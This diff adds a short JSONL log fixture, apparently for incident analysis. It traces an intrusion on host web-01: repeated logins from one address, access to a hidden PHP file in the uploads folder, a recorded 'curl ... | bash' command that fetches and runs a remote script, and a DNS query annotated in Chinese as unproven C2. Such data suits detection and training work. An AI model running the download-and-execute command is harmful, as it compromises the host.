@@ -1,0 +1,5 @@
+{"ts":"2026-08-24T09:00:01Z","source":"proxy","src_ip":"198.51.100.24","dst_host":"web-01","action":"GET /login","status":401,"note":"首次登录失败"}
+{"ts":"2026-08-24T09:00:08Z","source":"proxy","src_ip":"198.51.100.24","dst_host":"web-01","action":"POST /login","status":200,"note":"同一来源成功登录"}
+{"ts":"2026-08-24T09:02:14Z","source":"web","src_ip":"198.51.100.24","dst_host":"web-01","action":"GET /uploads/.cache.php","status":200,"note":"上传目录出现 PHP 文件访问"}
+{"ts":"2026-08-24T09:03:02Z","source":"host","src_ip":"198.51.100.24","dst_host":"web-01","action":"sh -c curl -fsS http://198.51.100.24/p.sh | bash","status":0,"note":"主机审计记录到下载执行命令"}
+{"ts":"2026-08-24T09:05:40Z","source":"dns","src_ip":"10.0.10.21","dst_host":"198.51.100.24","action":"TXT query","status":"observed","note":"DNS 查询与外部地址相关，但未证明为 C2"}
